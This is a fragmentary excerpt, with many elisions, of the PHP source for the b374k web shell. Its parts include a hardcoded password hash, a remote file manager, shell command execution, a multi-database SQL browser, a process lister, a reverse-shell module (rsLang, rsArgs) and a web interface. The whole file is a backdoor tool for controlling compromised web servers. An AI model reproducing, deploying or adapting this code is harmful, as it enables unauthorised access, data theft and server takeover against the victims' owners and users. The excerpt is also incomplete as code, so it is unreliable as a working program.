...
*/
$GLOBALS['pass'] = "4b91d138d6298a78069c5117e757f6d3dcf2186b"; // sha1(md5(pass))
...
if (!function_exists('get_cwd')) {
    function get_cwd()
    {
        ...
        if (!isset($_COOKIE['cwd'])) {
            ...
            if (is_dir($cwd_c)) $cwd = realpath($cwd_c) . DIRECTORY_SEPARATOR; else setcookie("cwd", $cwd);
        }
        return $cwd;
    }
}
...
if (!function_exists('fix_magic_quote')) {
    function fix_magic_quote($arr)
    {
        ...
        if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
            if (is_array($arr)) {
                foreach ($arr as $k => $v) {
                    if (is_array($v)) $arr[$k] = clean($v); else $arr[$k] = (empty($quotes_sybase) || $quotes_sybase === 'off') ? stripslashes($v) : stripslashes(str_replace("\'\'", "\'", $v));
                }
            }
        }
        return $arr;
...
if (!function_exists('html_safe')) {
    ...
    {
        return (htmlspecialchars(Yuri2::autoEncoding($str), 2 | 1));
    }
}
...
if (!function_exists('zip')) {
            ...
            foreach ($files as $file) {
                ...
                if (is_dir($file)) {
                    ...
                    foreach ($filesIterator as $iterator) {
                        ...
                        if (is_dir($iterator)) $zip->addEmptyDir(str_replace($file . '/', '', $iterator . '/')); else if (is_file($iterator)) $zip->addFromString(str_replace($file . '/', '', $iterator), read_file($iterator));
                    }
    ...
    function compress($type, $archive, $files)
    {
        if (!is_array($files)) $files = array($files);
        if ($type == 'zip') {
            if (zip($files, $archive)) return true; else return false;
        } elseif (($type == 'tar') || ($type == 'targz')) {
            $archive = basename($archive);
            $listsBasename = array_map("basename", $files);
            $lists = array_map("wrap_with_quotes", $listsBasename);
            if ($type == 'tar') execute("tar cf \"" . $archive . "\" " . implode(" ", $lists)); elseif ($type == 'targz') execute("tar czf \"" . $archive . "\" " . implode(" ", $lists));
            if (is_file($archive)) return true; else return false;
        }
        return false;
    }
    ...
    function decompress($type, $archive, $path)
    {
        ...
        if (is_dir($path)) {
            ...
            if ($type == 'unzip') {
                ...
                $target = "";
                if (strpos(strtolower($archive), ".tar.gz") !== false) $target = basename($archive, ".tar.gz"); elseif (strpos(strtolower($archive), ".tgz") !== false) $target = basename($archive, ".tgz");
                if (!is_dir($target)) mkdir($target);
                $before = count(get_all_files($target));
    ...
    function get_fileperms($file)
    {
        if ($perms = @fileperms($file)) {
            $flag = 'u';
            if (($perms & 0xC000) == 0xC000) $flag = 's'; elseif (($perms & 0xA000) == 0xA000) $flag = 'l';
    ...
    function rmdirs($dir, $counter = 0)
    {
        ...
        if ($dh = opendir($dir)) {
            while (($f = readdir($dh)) !== false) {
                if (($f != '.') && ($f != '..')) {
                    $f = $dir . $f;
                    if (@is_dir($f)) $counter += rmdirs($f); else {
                        if (unlink($f)) $counter++;
                    }
                }
            }
    ...
    function view_file($file, $type, $preserveTimestamp = 'true')
    {
        ...
        if (is_file($file)) {
            ...
            if ($type == "auto") {
                if (is_array($image_info)) $type = 'image'; elseif (!empty($mime)) $type = "multimedia";
                else $type = "raw";
            }
            $content = "";
            if ($type == "code") {
    ...
    {
        if (is_writable(".")) return realpath(".") . DIRECTORY_SEPARATOR; else {
    ...
    function get_drives()
    {
        ...
        foreach (range("A", "Z") as $letter) {
            if (@is_readable($letter . ":\\")) {
                ...
                if ($letter . ":" != $v) $drives .= $letter; else {
    ...
    function show_all_files($path)
    {
        ...
        if ($res = opendir($path)) {
            while ($file = readdir($res)) {
                if (($file != '.') && ($file != "..")) {
                    if (is_dir($file)) $allfolders[] = $file; elseif (is_file($file)) $allfiles[] = $file;
                }
            }
        }
    ...
    function eval_get_supported()
    {
        ...
        if (strpos($check, "usage") !== false) $eval_supported[] = "node"; else {
...
if (isset($p['cd'])) {
    ...
    if ($findType == 'file') $candidate = array_filter($candidate, "is_file"); elseif ($findType == 'folder') $candidate = array_filter($candidate, "is_dir");
    else $res = "error";
    ...
    if (is_file($entry)) output('file'); elseif (is_dir($entry)) output('folder');
    output('error');
...
</table>"; if (!function_exists('decode')) {
    function decode($str)
    {
        $res = "";
...
"; if (!function_exists('sql_connect')) {
    ...
    {
        if ($sqltype == 'mysql') {
            if (class_exists('mysqli')) return new mysqli($sqlhost, $sqluser, $sqlpass); elseif (function_exists('mysql_connect')) return @mysql_connect($sqlhost, $sqluser, $sqlpass);
            ...
            if (class_exists('SQLite3')) if (!empty($sqlhost)) return new SQLite3($sqlhost); else return false;
            ...
            if (class_exists('PDO')) if (!empty($sqlhost)) return new PDO($sqlhost, $sqluser, $sqlpass); else return false;
        }
        return false;
    }
    ...
    {
        if ($sqltype == 'mysql') {
            if (class_exists('mysqli')) return $con->query($query); elseif (function_exists('mysql_query')) return mysql_query($query);
        } elseif ($sqltype == 'mssql') {
            if (function_exists('sqlsrv_query')) return sqlsrv_query($con, $query); elseif (function_exists('mssql_query')) return mssql_query($query);
    ...
    {
        if ($sqltype == 'mysql') {
            if (class_exists('mysqli_result')) return $result->mysqli_num_rows; elseif (function_exists('mysql_num_rows')) return mysql_num_rows($result);
        } elseif ($sqltype == 'mssql') {
            if (function_exists('sqlsrv_num_rows')) return sqlsrv_num_rows($result); elseif (function_exists('mssql_num_rows')) return mssql_num_rows($result);
    ...
    {
        if ($sqltype == 'mysql') {
            if (class_exists('mysqli_result')) return $result->field_count; elseif (function_exists('mysql_num_fields')) return mysql_num_fields($result);
        } elseif ($sqltype == 'mssql') {
            if (function_exists('sqlsrv_num_fields')) return sqlsrv_num_fields($result); elseif (function_exists('mssql_num_fields')) return mssql_num_fields($result);
    ...
    {
        if ($sqltype == 'mysql') {
            if (class_exists('mysqli_result')) return $result->fetch_row(); elseif (function_exists('mysql_fetch_row')) return mysql_fetch_row($result);
        } elseif ($sqltype == 'mssql') {
            if (function_exists('sqlsrv_fetch_array')) return sqlsrv_fetch_array($result, 1); elseif (function_exists('mssql_fetch_row')) return mssql_fetch_row($result);
    ...
    {
        if ($sqltype == 'mysql') {
            if (class_exists('mysqli')) return $con->close(); elseif (function_exists('mysql_close')) return mysql_close($con);
        } elseif ($sqltype == 'mssql') {
            if (function_exists('sqlsrv_close')) return sqlsrv_close($con); elseif (function_exists('mssql_close')) return mssql_close($con);
    ...
    if ($con !== false) {
        if (isset($p['dbQuery'])) {
            ...
            if (($type != 'pdo') && ($type != 'odbc')) {
                if ($type == 'mysql') $showdb = "SHOW DATABASES"; elseif ($type == 'mssql') $showdb = "SELECT name FROM master..sysdatabases";
                ...
                if ($query_db != false) {
                    while ($db_arr = sql_fetch_data($type, $query_db)) {
                        foreach ($db_arr as $db) {
                            if ($type == 'mysql') $showtbl = "SHOW TABLES FROM " . $db; elseif ($type == 'mssql') $showtbl = "SELECT name FROM " . $db . "..sysobjects WHERE xtype = 'U'";
...
$GLOBALS['module']['info']['content'] = "<div class='border infoResult'></div>"; if (!function_exists('info_getinfo')) {
    function info_getinfo()
    {
        ...
        foreach ($access as $k => $v) {
            $version = execute($v);
            $version = explode("\n", $version);
            if ($version[0]) $version = $version[0]; else $version = "?";
...
"; if (isset($p['rsLang']) && isset($p['rsArgs'])) {
    ...
    if (ctype_xdigit($packetContent)) $packetContent = @pack("H*", $packetContent); else {
...
$GLOBALS['module']['processes']['content'] = ""; if (!function_exists('show_processes')) {
    function show_processes()
    {
        ...
        $res = Yuri2::autoEncoding(execute($cmd));
        if (trim($res) == '') return false; else {
                    ...
                    if ($fi) {
                        ...
                        foreach ($psln as $p) {
                            ...
                            if ($tblcount == 0) {
                                ...
                                $tblcount++;
                                if ($tblcount == count($psln)) $output .= "<td style='text-align:left;'>" . $p . "</td>"; else $output .= "<td style='text-align:center;'>" . $p . "</td>";
                            }
                        }
                        $output .= "</tr>";
                    }
    ...
    if ($counter > 0) output($counter); else output('error');
} $error = @ob_get_contents();
...
<head>
    ...
    <style type="text/css">
        ...
        * {
        ...
        #totop, #tobottom, #toggleBasicInfo {
...
<div id='wrapper'>
    ...
    <div id='header'>
        <!--header info start-->
        <div id='headerNav'>
            <span><a onclick="set_cookie('cwd', '');"
                     href='<?php echo get_self(); ?>'><?php echo $GLOBALS['title'] . " " . $GLOBALS['ver'] ?></a></span>
            <img onclick='viewfileorfolder();' id='b374k' src='<?php echo get_resource('b374k'); ?>'/>&nbsp;<span
                    id='nav'><?php echo $nav; ?></span><a class='boxclose' id='logout' title='log out'>x</a>
...
<table id="overlay">
    <tr>
        <td>
            <div id="loading" ondblclick='loading_stop();'></div>
        </td>
    </tr>
</table>
...
<script type='text/javascript'>
    ...
    sorttable = {
        e: function () {
            ...
            if (1 == a.tHead.rows.length) {
                ...
                for (b = 0; b < headrow.length; b++)if (!headrow[b].className.match(/\bsorttable_nosort\b/)) {
                    ...
                    if (c.addEventListener) c.addEventListener("click", e, j); else {
                        e.f || (e.f = n++);
                        c.b || (c.b = {});
                        var g = c.b.click;
            ...
            sortfn = sorttable.l;
            for (var c = 0; c < a.tBodies[0].rows.length; c++)if (text = sorttable.d(a.tBodies[0].rows[c].cells[b]), "" != text) {
    ...
    function l(a, b) {
        if (a) {
            var c = Object;
            if (a instanceof Function) c = Function; else {
    ...
    function send_post(targetdata, callback, loading) {
        ...
        $.ajax({
            url: targeturl, type: 'POST', data: targetdata, success: function (res) {
                callback(res);
    ...
    function show_tab(id) {
        if (!id) {
            if (location.hash != '') id = location.hash.substr(2); else id = defaultTab
        }
        refresh_tab(id)
    }
    ...
    function mass_act(type) {
        ...
        if ((type == 'cut') || (type == 'copy')) {
            ...
            if (bufferLength > 0) {
                ...
                if (bufferAction == 'cut') title = 'move'; else if (bufferAction == 'copy') title = 'copy';
            ...
            if (type == 'extract (tar)') arcType = 'untar'; else if (type == 'extract (tar.gz)') arcType = 'untargz'; else if (type == 'extract (zip)') arcType = 'unzip';
            if (buffer.length > 0) {
                massBuffer = '';
                $.each(buffer, function (i, v) {
                    massBuffer += v + '\n'
    ...
    function mass_act_go(massType) {
        ...
        if (massType == 'paste') {
            ...
            if (bufferLength > 0) {
                ...
                massBuffer = $.trim(massBuffer);
                if (bufferAction == 'copy') massType = 'copy'; else if (bufferAction == 'cut') massType = 'cut'
            }
    ...
    function xpl_update_status() {
        ...
        if (totalSelected == 0) $('.xplSelected').html(''); else $('.xplSelected').html(', ' + totalSelected + ' item(s) selected')
    }
    function xpl_bind() {
        $('.navigate').off('click');
    ...
    function rs_go(rsType) {
        ...
        if (rsArgs != '') {
            send_post({rsLang: rsLang, rsArgs: rsArgs}, function (res) {
                if (res != 'error') {
                    splits = res.split('{[|b374k|]}');
                    if (splits.length == 2) {
                        output = splits[0] + "<hr>" + splits[1];
    ...
    function ps_update_status() {
        ...
        if (totalSelected == 0) $('.psSelected').html(''); else $('.psSelected').html(' ( ' + totalSelected + ' item(s) selected )')
    }
